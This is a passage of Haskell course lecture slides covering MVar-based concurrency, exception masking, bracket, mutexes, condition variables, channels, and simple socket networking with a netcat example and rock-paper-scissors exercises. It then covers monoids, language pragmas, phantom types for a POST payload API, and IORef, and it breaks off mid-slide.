   -  If an ``MVar`` is full, ``takeMVar`` makes it empty and returns
      former contents
   -  If an ``MVar`` is empty, ``putMVar`` fills it with a value
   -  Taking an empty ``MVar`` or putting a full one puts thread to
      sleep until ``MVar`` becomes available
   -  Only one thread awakened at a time if several blocked on same
      ``MVar``
   -  There are also non-blocking versions of ``MVar`` calls

   .. code:: haskell

      tryTakeMVar :: MVar a -> IO (Maybe a) -- Nothing if empty
      tryPutMVar :: MVar a -> a -> IO Bool  -- False if full

Example: pingpong benchmark
===========================

.. code:: haskell

   import Control.Concurrent
   import Control.Exception
   import Control.Monad

   pingpong :: Bool -> Int -> IO ()
   pingpong v n = do
     mvc <- newEmptyMVar   -- MVar read by child
     mvp <- newEmptyMVar   -- MVar read by parent
     let parent n | n > 0 = do when v $ putStr $ " " ++ show n
                               putMVar mvc n
                               takeMVar mvp >>= parent
                  | otherwise = return ()
         child = do n <- takeMVar mvc
                    putMVar mvp (n - 1)
                    child
     tid <- forkIO child
     parent n `finally` killThread tid
     when v $ putStrLn ""

::

   *Main> pingpong True 10
    10 9 8 7 6 5 4 3 2 1

Sidenote: benchmarking
======================

-  Bryan has a kick-ass benchmarking library
   `criterion <http://hackage.haskell.org/package/criterion>`__

.. code:: haskell

   import Criterion.Main

   ...

   main :: IO ()
   main = defaultMain [
           bench "thread switch test" mybench
          ]
       where mybench = pingpong False 10000

::

   $ ghc -O pingpong.hs 
   [1 of 1] Compiling Main             ( pingpong.hs, pingpong.o )
   Linking pingpong ...
   $ ./pingpong 
   ...
   benchmarking thread switch test
   mean: 3.774590 ms, lb 3.739223 ms, ub 3.808865 ms, ci 0.950
   ...

-  ~3.8 msec for 20,000 thread switches = ~190 nsec/switch

OS threads
==========

-  GHC also has *two* versions of the haskell runtime

   -  By default, all Haskell threads run in a single OS thread
   -  Link with ``-threaded`` to allow OS threads (``pthread_create``)
      as well

-  ``forkOS`` call creates Haskell thread *bound* to a new OS thread

   .. code:: haskell

      forkOS :: IO () -> IO ThreadId

-  Also, when linked with ``-threaded``, initial thread is bound

-  Whoa‚Ä¶ what happened? ``-threaded`` 30 times slower?

::

   $ rm pingpong
   $ ghc -threaded -O pingpong.hs 
   Linking pingpong ...
   $ ./pingpong
   ...
   mean: 121.1729 ms, lb 120.5601 ms, ub 121.7044 ms, ci 0.950
   ...

Bound vs. unbound threads
=========================

-  Without ``-threaded``, all Haskell threads run in one OS thread

   -  Thread switch is basically just a procedure call, i.e. super-fast

-  ``-threaded`` introduces multiple OS-level threads

   -  Some Haskell threads are *bound* to a particular OS thread
   -  *Unbound* Haskell threads share (and migrate between) OS threads
   -  ``unbound`` haskell threads have same performance as w/o
      ``-threaded``

-  Initial thread bound, so we were actually benchmarking Linux

   -  Can wrap parent thread in ``forkIO`` to make it unbound

   .. code:: haskell

      wrap :: IO a -> IO a
      wrap action = do
        mv <- newEmptyMVar
        _ <- forkIO $ (action >>= putMVar mv) `catch`
                      \e@(SomeException _) -> putMVar mv (throw e)
        takeMVar mv

   -  But library has better function
      ```runInUnboundThread`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent.html#v:runInUnboundThread>`__

What good are OS threads?
=========================

-  If an unbound thread blocks, can block whole program

   -  Unix runtime tries to avoid blocking syscalls, but can‚Äôt avoid
      blocking for things like file system IO and paging
   -  Also relevant to foreign function interface (FFI)
   -  GHC allows to kinds of calls into C code, ``safe`` and ``unsafe``
   -  With ``-threaded``, GHC ensures ``safe`` FFI calls run in separate
      OS thread
   -  ``unsafe`` FFI calls from unbound threads can block other threads

-  FFI functions may expect to be called from same thread

   -  E.g., foreign code using ``pthread_getspecific`` can get confused
      if called from a migrated unbound thread

-  May want to override scheduler and run on particular CPU

   -  E.g., see
      ```forkOn`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent.html#v:forkOn>`__

Asynchronous exceptions
=======================

-  Some handy ``MVar`` utility functions for updating a value

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a, b)) -> IO b
      modifyMVar_ :: MVar a -> (a -> IO a) -> IO ()

   -  E.g., ‚Äú``modifyMVar x (\n -> return (n+1, n))``‚Äù like ‚Äú``x++``‚Äù in
      C

-  How would you implement ``modifyMVar``?

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a,b)) -> IO b
      modifyMVar m action = do
        v0 <- takeMVar m
        (v, r) <- action v0 `onException` putMVar m v0
        putMVar m v
        return r

   -  Anyone see a problem? (Hint: remember ``throwTo``, ``killThread``)

.. _asynchronous-exceptions-1:

Asynchronous exceptions
=======================

-  Some handy ``MVar`` utility functions for updating a value

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a, b)) -> IO b
      modifyMVar_ :: MVar a -> (a -> IO a) -> IO ()

   -  E.g., ‚Äú``modifyMVar x (\n -> return (n+1, n))``‚Äù like ‚Äú``x++``‚Äù in
      C

-  How would you implement ``modifyMVar``?

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a,b)) -> IO b
      modifyMVar m action = do
        v0 <- takeMVar m -- -------------- oops, race condition
        (v, r) <- action v0 `onException` putMVar m v0
        putMVar m v
        return r

   -  What if another thread calls ``killThread`` on the current thread
      while current thread between ``takeMVar`` and ``onException``
   -  ``timeout`` and ``wrap`` functions from a few slides ago have same
      problem

Masking exceptions
==================

-  The
   ```mask`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html#v:mask>`__
   function can sidestep such race conditions

   .. code:: haskell

      mask :: ((forall a. IO a -> IO a) -> IO b) -> IO b

   -  This is a funny type signature‚Äìuses an extension called
      ``RankNTypes``. For now, ignore ‚Äú``forall a.``‚Äù‚Äìjust makes
      function more flexible
   -  ``mask $ \f -> b`` runs action ``b`` with asynchronous exceptions
      *masked*
   -  Function ``f`` allows exceptions to be *unmasked* again for an
      action
   -  Exceptions are also unmasked if thread sleeps (e.g., in
      ``takeMVar``)

-  Example: Fixing ``modifyMVar``

   .. code:: haskell

      modifyMVar :: MVar a -> (a -> IO (a,b)) -> IO b
      modifyMVar m action = mask $ \unmask -> do
        v0 <- takeMVar m -- automatically unmasked while waiting
        (v, r) <- unmask (action v0) `onException` putMVar m v0
        putMVar m v
        return r

Masking exceptions (continued)
==============================

-  ``forkIO`` preserves the current mask state

   -  Can use the ``unmask`` function in child thread

-  Example: fixed ``wrap`` function

.. code:: haskell

   wrap :: IO a -> IO a          -- Fixed version of wrap
   wrap action = do
     mv <- newEmptyMVar
     mask $ \unmask -> do
         tid <- forkIO $ (unmask action >>= putMVar mv) `catch`
                         \e@(SomeException _) -> putMVar mv (throw e)
         let loop = takeMVar mv `catch` \e@(SomeException _) ->
                    throwTo tid e >> loop
         loop

-  Note we don‚Äôt call ``unmask`` in parent thread

   -  ``loop`` will sleep on ``takeMVar``, which implicitly unmasks
   -  Unmask while sleeping is generally what you want, but can avoid
      with
      `uninterruptibleMask <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html#v:uninterruptibleMask>`__

The bracket function
====================

-  ``mask`` is tricky, but library function
   ```bracket`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html#v:bracket>`__
   simplifies use

   .. code:: haskell

      bracket :: IO a -> (a -> IO b) -> (a -> IO c) -> IO c

-  Example: process file without leaking handle

   .. code:: haskell

      bracket (openFile "/etc/mtab" ReadMode) -- first
              hClose                          -- last
              (\h -> hGetContents h >>= doit) -- main

-  Example: fix ``parent`` function from our ``timeout`` example

   .. code:: haskell

        parent = do ctid <- forkIO child             -- old code,
                    result <- action                 -- bad if async
                    killThread ctid                  -- exception
                    return $ Just result

   .. code:: haskell

        parent = bracket (forkIO child) killThread $ -- new code
                 \_ -> fmap Just action

Working with ``MVar`` s
========================

-  ``MVar`` s work just fine as a mutex:

   .. code:: haskell

      -- type introduces type alias (like typedef in C)
      type Mutex = MVar ()

      mutex_create :: IO Mutex
      mutex_create = newMVar ()

      mutex_lock, mutex_unlock :: Mutex -> IO ()
      mutex_lock = takeMVar
      mutex_unlock mv = putMVar mv ()

      mutex_synchronize :: Mutex -> IO a -> IO a
      mutex_synchronize mv action =
          bracket (mutex_lock mv) (\_ -> mutex_unlock mv)
                      (\_ -> action)

-  Note anyone can unlock a ``Mutex`` if it is locked

   -  How would you throw assertion failure if caller doesn‚Äôt hold lock?

Alternate ``Mutex``
===================

-  Use *full* ``MVar`` rather than empty to mean lock held

   .. code:: haskell

      type Mutex = MVar ThreadId

      mutex_create :: IO Mutex
      mutex_create = newEmptyMVar

      mutex_lock, mutex_unlock :: Mutex -> IO ()

      mutex_lock mv = myThreadId >>= putMVar mv

      mutex_unlock mv = do mytid <- myThreadId
                           lockTid <- tryTakeMVar mv
                           unless (lockTid == Just mytid) $
                               error "mutex_unlock"

   -  Store ``ThreadId`` of lock owner in ``MVar``

-  How would you implement a condition variable?

   -  Many uses of condition variables don‚Äôt work with async exceptions
   -  So let‚Äôs not worrying about ``mask`` for this question‚Ä¶

Condition variables
===================

.. code:: haskell

   data Cond = Cond (MVar [MVar ()])

   cond_create :: IO Cond
   cond_create = liftM Cond $ newMVar []
   -- liftM is fmap for Monads (i.e., no required Functor instance):
   -- liftM f m1 = do x <- m1; return (f m1)

   cond_wait :: Mutex -> Cond -> IO ()
   cond_wait m (Cond waiters) = do
     me <- newEmptyMVar
     modifyMVar_ waiters $ \others -> return $ others ++ [me]
     mutex_unlock m   -- note we don't care if preempted after this
     takeMVar me `finally` mutex_lock m
     
   cond_signal, cond_broadcast :: Cond -> IO ()
   cond_signal (Cond waiters) = modifyMVar_ waiters wakeone
       where wakeone [] = return []
             wakeone (w:ws) = putMVar w () >> return ws

   cond_broadcast (Cond waiters) = modifyMVar_ waiters wakeall
       where wakeall ws = do mapM_ (flip putMVar ()) ws
                             return []

-  Key idea: putting ``MVar`` s inside ``MVar`` s is very powerful

Channels
========

-  ```Control.Concurrent.Chan`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent-Chan.html>`__
   provides unbounded *channels*

   -  Implemented as two ``MVar`` s ‚Äì for read and and write end of
      ``Stream``

   .. code:: haskell

      data Item a = Item a (Stream a)
      type Stream a = MVar (Item a)
      data Chan a = Chan (MVar (Stream a)) (MVar (Stream a))

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/chan.svg


Channel implementation [simplified]
===================================

.. code:: haskell

   data Item a = Item a (Stream a)
   type Stream a = MVar (Item a)
   data Chan a = Chan (MVar (Stream a)) (MVar (Stream a))

   newChan :: IO (Chan a)
   newChan = do
     empty <- newEmptyMVar
     liftM2 Chan (newMVar empty) (newMVar empty)
   -- liftM2 is like liftM for functions of two arguments:
   -- liftM2 f m1 m2 = do x1 <- m1; x2 <- m2; return (f x1 x2)

   writeChan :: Chan a -> a -> IO ()
   writeChan (Chan _ w) a = do
     empty <- newEmptyMVar
     modifyMVar_ w $ \oldEmpty -> do
       putMVar oldEmpty (Item a empty)
       return empty

   readChan :: Chan a -> IO a
   readChan (Chan r _) =
       modifyMVar r $ \full -> do
         (Item a newFull) <- takeMVar full
         return (newFull, a)

Networking
==========

-  High-level Stream (TCP & Unix-domain) socket support in
   ```Network`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network.html>`__

   .. code:: haskell

      connectTo :: HostName -> PortID -> IO Handle
      listenOn :: PortID -> IO Socket
      accept :: Socket -> (Handle, HostName, PortNumber)
      sClose :: Socket -> IO ()
      hClose :: Handle -> IO ()

-  Exercise: Network-enabled rock-paper-scissors. Define:

   .. code:: haskell

      withClient :: PortID -> (Handle -> IO a) -> IO a

-  This accepts connection, plays single game, exits

   ::

      *Main> withClient (PortNumber 1617) (computerVsUser Rock)

   ::

      $ nc localhost 1617
      Please enter one of [Rock,Paper,Scissors]
      Rock
      You Tie

-  Start with last week‚Äôs code: ``wget``
   ```cs240h.stanford.edu/rock2.hs`` <http://cs240h.stanford.edu/rock2.hs>`__

.. _solution-1:

Solution
========

.. code:: haskell

   withClient :: PortID -> (Handle -> IO a) -> IO a
   withClient listenPort fn =
     bracket (listenOn listenPort) sClose $ \s -> do
       bracket (accept s) (\(h, _, _) -> hClose h) $
         \(h, host, port) -> do
           putStrLn $ "Connection from host " ++ host
                      ++ " port " ++ show port
           fn h

Exercise
========

-  Build a program ``netrock`` that plays two users against one another
   and exits after one game

   ::

      $ nc localhost 1617
      Please enter one of [Rock,Paper,Scissors]
      Rock
      You Win

   ::

      $ nc localhost 1617
      Please enter one of [Rock,Paper,Scissors]
      Scissors
      You Lose

-  Start here: ``wget``
   ```cs240h.stanford.edu/netrock.hs`` <http://cs240h.stanford.edu/netrock.hs>`__,
   implement:

   .. code:: haskell

      netrock :: PortID -> IO ()

   -  You may find it useful to define and use:

      .. code:: haskell

         play :: MVar Move -> MVar Move
              -> (Handle, HostName, PortNumber) -> IO ()
         play myMoveMVar opponentMoveMVar (h, host, port) = do

   -  If your OS is missing ``nc``: ``wget``
      ```cs240h.stanford.edu/netcat.hs`` <http://cs240h.stanford.edu/netcat.hs>`__

.. _solution-2:

Solution
========

.. code:: haskell

   play :: MVar Move -> MVar Move
        -> (Handle, HostName, PortNumber) -> IO ()
   play myMoveMVar opponentMoveMVar (h, host, port) = do
     putStrLn $ "Connection from host " ++ host ++ " port " ++ show port
     myMove <- getMove h
     putMVar myMoveMVar myMove
     opponentMove <- takeMVar opponentMoveMVar
     let o = outcome myMove opponentMove
     hPutStrLn h $ "You " ++ show o

   netrock :: PortID -> IO ()
   netrock listenPort =
     bracket (listenOn listenPort) sClose $ \s -> do
       mv1 <- newEmptyMVar
       mv2 <- newEmptyMVar
       let cleanup mv (h,_,_) = do
             tryPutMVar mv (error "something blew up")
             hClose h
       wait <- newEmptyMVar
       forkIO $ bracket (accept s) (cleanup mv1) (play mv1 mv2)
         `finally` putMVar wait ()
       bracket (accept s) (cleanup mv2) (play mv2 mv1)
       takeMVar wait

.. _networking-1:

Networking
==========

-  Also have low-level BSD socket support in
   ```Network.Socket`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html>`__

   .. code:: haskell

      socket :: Family -> SocketType -> ProtocolNumber -> IO Socket
      connect :: Socket -> SockAddr -> IO ()
      bindSocket :: Socket -> SockAddr -> IO ()
      listen :: Socket -> Int -> IO ()
      accept :: Socket -> IO (Socket, SockAddr)

   -  ```getAddrInfo`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html#v:getAddrInfo>`__
      looks up hostnames just like
      `[RFC3493] <http://tools.ietf.org/html/rfc3493>`__ (returns
      ``[`` ```AddrInfo`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html#t:AddrInfo>`__ ``]``)

   .. code:: haskell

      getAddrInfo :: Maybe AddrInfo
                  -> Maybe HostName -> Maybe ServiceName
                  -> IO [AddrInfo]

   -  Example: Get ``SockAddr`` for talking to web server:

   .. code:: haskell

      webServerAddr :: String -> IO SockAddr
      webServerAddr name = do
        addrs <- getAddrInfo Nothing (Just name) (Just "www")
        return $ addrAddress $ head $ addrs

Example: netcat
===============

.. code:: haskell

   netcat :: String -> String -> IO ()
   netcat host port = do
     -- Extract address from first AddrInfo in list
     AddrInfo{ addrAddress = addr, addrFamily = family }:_
         <- getAddrInfo Nothing (Just host) (Just port)

     -- Create a TCP socket connected to server
     s <- socket family Stream 0
     connect s addr

     -- Convert socket to handle
     h <- socketToHandle s ReadWriteMode
     hSetBuffering h NoBuffering  -- THIS IS IMPORTANT

     -- Punt on complex locale stuff
     hSetBinaryMode stdout True

     -- Copy data back and forth taking advantage of laziness
     done <- newEmptyMVar
     forkIO $ (hGetContents h >>= putStr) `finally` putMVar done ()
     getContents >>= hPutStr h
     takeMVar done


/L4 Phantoms
============


Let's think about a programming pattern we've seen, but not paid
attention to.

Patterns: I
===========

.. code:: haskell

   0

.. code:: haskell

   0 + n  ==  n
   n + 0  ==  n

.. code:: haskell

   (a + b) + c  ==  a + (b + c)

Patterns: II
============

.. code:: haskell

   1

.. code:: haskell

   1 * n  ==  n
   n * 1  ==  n

.. code:: haskell

   (a * b) * c  ==  a * (b * c)

Patterns: III
=============

.. code:: haskell

   []

.. code:: haskell

   [] ++ n  ==  n
   n ++ []  ==  n

.. code:: haskell

   (a ++ b) ++ c  ==  a ++ (b ++ c)

Patterns: IV
============

.. code:: haskell

   True

.. code:: haskell

   True && n  ==  n
   n && True  ==  n

.. code:: haskell

   (a && b) && c == a && (b && c)

Patterns, abstracted
====================

Typeclass: 

.. code:: haskell

   class Monoid a where
       -- A "zero element"
       mempty  :: a
       -- An associative operation
       mappend :: a -> a -> a

Where can you find this typeclass? 

.. code:: haskell

   import Data.Monoid

Monoids
=======

Instances of ``Monoid`` must obey some rules.

Rule 1: identity element 

.. code:: haskell

   mempty `mappend` n  ==  n
   n `mappend` mempty  ==  n

Rule 2: our associative operation *must actually associate*.

.. code:: haskell

   (a `mappend` b) `mappend` c  ==
   a `mappend` (b `mappend` c)

Rules?
======

Monoids come from abstract algebra.

In abstract algebra, rules that must be true are called *axioms*.

Also called *laws*.

In Haskell, how are these rules/axioms/laws enforced? 

-  They are not.

Monoids for lists
=================

Here's the easiest and most familiar-to-Haskellers case: 

.. code:: haskell

   instance Monoid [a] where
        mempty           = []
        xs `mappend` ys  = xs ++ ys

Pop quiz: 

-  What other definition(s) would follow the ``Monoid`` laws?

-  Do they make any sense?

Monoids for numbers?
====================

Numbers are an interesting case.

Addition as monoid: 

-  Identity ``0``

-  Associative operator ``+``

Multiplication as monoid: 

-  Identity ``1``

-  Associative operator ``*``

When do we use typeclasses?
===========================

Suppose you want to abstract a code pattern into a typeclass.

Under what circumstances is this likely to work best? 

-  When there is *just one* "canonical" behaviour you expect for a given
   type.

For lists, our ``Monoid`` instance *is* canonical: 

-  Any other behaviour that follows the laws is just *weird*.

For numbers, we have two sensible behaviours: 

-  No one ``Monoid`` instance can be called canonical!

Monoids for multiplication
==========================

.. code:: haskell

   newtype Product a = Product { getProduct :: a }
       deriving (Eq, Ord, Read, Show, Bounded)

   instance Num a => Monoid (Product a) where
       mempty                        = Product 1

       Product x `mappend` Product y = Product (x * y)

Monoids for addition
====================

.. code:: haskell

   newtype Sum a = Sum { getSum :: a }
       deriving (Eq, Ord, Read, Show, Bounded)

   instance Num a => Monoid (Sum a) where
       mempty                = Sum 0

       Sum x `mappend` Sum y = Sum (x + y)

The ``Either`` type
===================

There exists a built-in type named ``Either``.

.. code:: haskell

   data Either a b = Left a | Right b

By convention: 

-  ``Left`` means "something went wrong"

-  ``Right`` means "result was a success"

Often used as follows: 

.. code:: haskell

   type Result a = Either String a

(where the ``String`` carries an error message)

Coding exercise
===============

Create a ``Monoid`` instance that will give the *first success* from a
chain of ``Either`` values.

Desired behaviour: 

.. code:: haskell

   Left "you goofed" `mappend`
   Left "i win!"     `mappend`
   Right "rats! you won!"

      ==

   Right "rats! you won!"

You have five minutes.

Ambient machinery for the coding exercise
=========================================

If you import ``Data.Monoid`` you will have the following definitions
available:

.. code:: haskell

   class Monoid a where
     mempty :: a
     mappend :: a -> a -> a

   data Either a b = Left a | Right b

Language hitch
==============

Did you try to write code like this? 

.. code:: haskell

   instance Monoid (Either a b) where
       mempty = Left {- what ??? -}

       Right a `mappend` _ = Right a
       _       `mappend` b = b

You surely ran into trouble while trying to define ``mempty``.

Why?

Type quantification
===================

In Haskell, type variables are *quantified*.

They stand in for all types in a given domain.

If there's no typeclass mentioned, a type variable is implicitly
*universally* quantified.

We can write these quantifiers explicitly: 

.. code:: haskell

   length :: forall a. [a] -> Int

"The ``length`` function must accept any list, no matter what type of
data it contains."

Universal quantification
========================

Why is universal quantification relevant here? 

.. code:: haskell

   instance Monoid (Either a b) where
       mempty = Left {- what ??? -}

.. _universal-quantification-1:

Universal quantification
========================

Why is universal quantification relevant here? 

.. code:: haskell

   instance Monoid (Either a b) where
       mempty = Left {- what ??? -}

Since ``mempty`` gives a "zero element", it must somehow produce a zero
element for the type ``a``.

But since ``a`` is universally quantified, it stands in for *every
type*.

Clearly there is no one legal value that is of every type.

It is impossible to write a sensible instance.

A possible fix
==============

This won't typecheck either: 

.. code:: haskell

   instance Monoid (Either String a) where
       mempty = Left "fnord"

       Right a `mappend` _ = Right a
       _       `mappend` b = b

However, we can make it compile by adding the following to the top of
our source file:

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

Pragmas
=======

This is a specially formatted comment: 

.. code:: haskell

   {- i am a normal comment -}

   {-# i am a special comment #-}

"Special" comments usually contain directives ("pragmas") that change
the compiler's behaviour.

The ``LANGUAGE`` pragma enables non-standard language features.

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

``FlexibleInstances`` makes the compiler consider `more typeclass
instances as
legal <http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#instance-rules>`__
than the Haskell 98 standard allows.

More about pragmas
==================

You'll see a few more pragmas as we progress.

Some are widely used, others are not.

Some are safe, others are not...

-  up to and including allowing the typechecker to go into an infinite
   loop! (``UndecidableInstances``)

``FlexibleInstances`` is widely used and often safe.

Back to our fix
===============

This *will* typecheck: 

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

   instance Monoid (Either String a) where
       mempty = Left "fnord"

       Right a `mappend` _ = Right a
       _       `mappend` b = b

But is it canonical?

Canonicality
============

Why worry about our ``Monoid`` instance being canonical? 

Any time you declare an instance of any typeclass: 

-  It is automatically made available to every module that imports your
   module.

-  You can't say "I don't want to import instance ``X``" :-(

If you define a weird instance of a popular typeclass, you'll "infect"
people who import your module.

-  Make sure your instances make sense!

Finally!
========

Via use of ``newtype``, we don't accidentally associate a silly
``Monoid`` instance with ``Either String a``.

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

   import Data.Monoid

   newtype FirstRight a b = FirstRight {
       getFirstRight :: Either a b
     }

   instance Monoid (FirstRight String a) where
     mempty = FirstRight (Left "suxx0rz")

     a@(FirstRight (Right _)) `mappend` _ = a
     _                        `mappend` b = b

HTTP POST
=========

Let's upload some vitally important data to a server.

::

   curl --data foo=bar --verbose \
     http://httpbin.org/post

Multipart form upload
=====================

When we POST multipart data to a form (e.g. uploading a photo), some
information is mandatory, while other stuff is optional.

.. code:: haskell

   data Part = Part {
       -- name of the <input> tag this belongs to
         name        :: String
       -- filename of file we're uploading
       , fileName    :: Maybe FilePath
       -- type of file
       , contentType :: Maybe ContentType
       -- file contents
       , body        :: String
       } deriving (Show)

Uploading data
==============

Suppose we want to build a HTTP client that supports POST.

Web pages tend to expect multipart form data, while REST APIs have
different needs.

Here are some types that let us represent a POST body.

.. code:: haskell

   type Param = (String, String)

   type ContentType = String

   data Payload = NoPayload
                | Raw ContentType String
                | Params [Param]
                | FormData [Part]
                  deriving (Show)

Can you write a ``Monoid`` instance for ``Payload``? 

Decide for yourself, then discuss with a partner for 2 minutes.

Huh
===

This part is easy enough: 

.. code:: haskell

   instance Monoid Payload where
       mempty = NoPayload

       mappend NoPayload b = b
       mappend a NoPayload = a

       mappend (Params a) (Params b) = Params (a++b)

       {- ... -}

What about the rest of ``mappend``? 

Semantic problems
=================

It is easy to see how we can glom together ``Params`` or ``FormData``.

.. code:: haskell

   data Payload = NoPayload
                | Raw ContentType String
                | Params [Param]
                | FormData [Part]

However, mixing ``Raw`` with ``Params``, or ``Params`` with
``FormData``, is nonsensical.

A straightforward ``Monoid`` instance will have to crash (!!!) if we try
this.

Handling failure (badly)
========================

What if we use the ``Maybe`` type to represent a failed attempt to
``mappend``?

.. code:: haskell

   {-# LANGUAGE FlexibleInstances #-}

   -- I dropped the NoPayload constructor. Why?
   data Payload = Raw ContentType String
                | Params [Param]
                | FormData [Part]
                  deriving (Show)

   instance Monoid (Maybe Payload) where
     mempty = Nothing

     mappend Nothing b = b
     mappend a Nothing = a

     mappend (Just (Params a)) (Just (Params b))
       = Just (Params (a++b))
     mappend (Just (FormData a)) (Just (FormData b))
       = Just (FormData (a++b))
     mappend _ _ = Nothing

Yay?
====

This compiles, but it has a conceptual problem.

-  Every time we use ``mappend``, we have to pattern-match the result to
   see if the ``mappend`` succeeded.

In API design circles, this is called "crappy".

But wait, it gets worse! 

O error message, where art thou?
================================

Let me try this in ``ghci``: 

.. code:: haskell

   Just (Params []) `mappend` Just (Params [])

Overlapping instances
=====================

Remember ``FlexibleInstances``? 

It allowed us to write a ``Monoid`` instance for the type
``Maybe Payload``.

Trouble is, ``Data.Monoid`` already defined an instance for ``Maybe a``.

``FlexibleInstances`` allows these two *definitions* to coexist happily.

But when we want to *use* an instance, GHC doesn't know which one to
use!

.. _overlapping-instances-1:

Overlapping instances
=====================

Enter the ``OverlappingInstances`` pragma: 

.. code:: haskell

   {-# LANGUAGE FlexibleInstances, OverlappingInstances #-}

This allows multiple instances to coexist *and* be used.

The most specific instance that is visible will be used.

A very handy extension!

-  Also a big semantic gun pointing at your foot.

Problems with overlapping instances
===================================

Why worry about ``OverlappingInstances``? 

-  Makes it very easy for incorrect programs to still typecheck.

-  Can cause confusing error messages.

-  A program that typechecks can have its meaning changed by adding an
   instance declaration in some remote module.

On the plus side, you can `publish papers about their problems <http://web.cecs.pdx.edu/~jgmorris/pubs/morris-icfp2010-instances.pdf>`__,
so they're not bad for an academic career.

Checking in
===========

We have a ``Monoid`` instance that: 

-  Has a janky API

-  Uses a dodgy language extension

Can we do better? 

Phantom types
=============

Let's add a type parameter on the left hand side of our ``Payload``
type.

.. code:: haskell

   data Payload a = NoPayload
                  | Raw ContentType String
                  | Params [Param]
                  | FormData [Part]
                  deriving (Show)

The type variable ``a`` *does not appear in the RHS*.

We call this a *phantom type*.

What's it for?

A tiny upload API
=================

.. code:: haskell

   param :: String -> String -> Payload [Param]
   param name value = Params [(name, value)]

.. code:: haskell

   filePart :: String -> FilePath -> IO (Payload [Part])
   filePart name path = do
     body <- readFile name
     return (FormData [Part name (Just path) Nothing body])

Consider the types
==================

.. code:: haskell

   param :: String -> String
         -> Payload [Param]

   filePart :: String -> FilePath
            -> IO (Payload [Part])

Notice:

-  The first function returns a ``Payload [Param]``

-  The second returns a ``Payload [Part]``

The phantom parameter makes these *distinct types*.

-  The runtime representation is the same in each case.

-  The compiler prevents us from mixing the two by accident.

Code moment
===========

Please write a body for ``addParams`` below.

.. code:: haskell

   instance Monoid (Payload [Param]) where
       mempty = NoPayload
       mappend = addParams

Download the code you'll need:

::

   curl -L http://cs240h.scs.stanford.edu/PayloadPhantom.hs

You have five minutes.

Making this all work
====================

We have a constrained public API for creating ``Payload`` values.

.. code:: haskell

   param :: String -> String -> Payload [Param]

   filePart :: String -> FilePath -> IO (Payload [Part])

   fileString :: String -> Maybe FilePath -> String -> (Payload [Part])

How do we enforce this?

We export the *name* of the type ``Part``, but *not any of its
constructors*.

Exporting a type
================

The ``(..)`` notation below means "export the type ``Part`` and all of
its constructors".

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       {- ... trimmed out ... -}
       ) where

.. _exporting-a-type-1:

Exporting a type
================

The ``(..)`` notation below means "export the type ``Part`` and all of
its constructors".

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       {- ... trimmed out ... -}
       ) where

Notice that we omit the ``(..)`` below, meaning "export the type
``Payload``, but *not any of its constructors*".

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       , Payload -- no constructors
       {- ... trimmed out ... -}
       ) where

.. _exporting-a-type-2:

Exporting a type
================

The ``(..)`` notation below means "export the type ``Part`` and all of
its constructors".

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       {- ... trimmed out ... -}
       ) where

So we export the ``Payload`` type, and *only* the functions that we
defined and control ("smart constructors") that construct values of this
type.

.. code:: haskell

   module PayloadPhantom
       (
         Part(..)
       , Payload -- no constructors
       , param
       , filePart
       , fileString
       {- ... trimmed out ... -}
       ) where

Trying it out
=============

In ``ghci``: 

::

   ghci> param "foo" "bar" <> param "baz" "quux"
   Params [("foo","bar"),("baz","quux")]

This uses my favourite operator from ``Data.Monoid``: 

.. code:: haskell

   (<>) :: Monoid m => m -> m -> m
   (<>) = mappend

What do we get if we try this? 

.. code:: haskell

   param "foo" "bar" <> fileString "baz" Nothing "quux"

Last of the monoids
===================

For which of the following should we write ``Monoid`` instances?

.. code:: haskell

   data Payload a = NoPayload
                  | Raw ContentType String
                  | Params [Param]
                  | FormData [Part]
                  deriving (Show)

Why care so much about monoids?
===============================

Monoids have many merits: 

-  Simple

-  Easy for clients to use

-  Force you to address API design problems early on

Monoids without an identity
===========================

Like the abstract algebraic approach? 

A package on Hackage named ``semigroups`` gives us monoids *without* an
identity operation: semigroups.

Alas:

-  The ``Monoid`` type was developed before the ``semigroups`` package

-  The two should be related, but thanks to this accident of history are
   not

Principles
==========

Why care about phantom types and monoids? 

-  We want to build the simplest correct libraries we can

Monoids help us focus on simplicity.

Phantom types make it easier to build APIs where flat-out broken
behaviours can be made impossible by the compiler.

Mutable variables
=================

We've already seen the very handy ``MVar`` type, which represents a
"blocking mutable box": we can put a value in or take one out, but we'll
block if we put when full or take when empty.

Even though ``MVar`` s are the fastest blocking concurrent structure in
the industry (they made the the Kessel Run in less than twelve
parsecs!), we don't always want blocking semantics.

For cases where we want *non-* blocking updates, there's the ``IORef``
type, which gives us mutable references.

.. code:: haskell

   import Data.IORef

   newIORef    :: a -> IO (IORef a)

   readIORef   :: IORef a -> IO a
   writeIORef  :: IORef a -> a -> IO ()

   modifyIORef :: IORef a -> (a -> a) -> IO ()

Managing mutation
=================

Application writers are often faced with a question like this:

-  I have a big app, and parts of it need their behaviour tweaked by an
   administrator at runtime.

There are of course many ways to address this sort of problem.

Let's consider one where we use a reference to a piece of config data.

Any code that's executing in the ``IO`` monad can, if it knows the name
of the config reference, retrieve the current config:

.. code:: haskell

